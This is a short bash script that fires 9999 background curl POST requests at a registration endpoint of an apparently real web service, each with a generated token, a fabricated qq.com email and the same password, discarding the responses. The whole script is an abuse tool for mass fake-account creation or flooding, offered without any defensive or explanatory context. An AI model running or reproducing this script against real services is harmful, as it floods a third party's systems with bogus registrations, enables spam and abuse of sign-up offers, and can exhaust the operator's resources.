for ((i=1; i<=9999; i++))  
do  
nohup curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -w "%{http_code}\n" -d "token=14d4a755977d93a${i}1dd8fa51e7f6&email=1919810${i}%40qq.com&password=123456aa&checkPassword=123456aa"    https://chachacloud.chunniu.ma/register?action=email > /dev/null 2>&1 &
echo run${i}
done
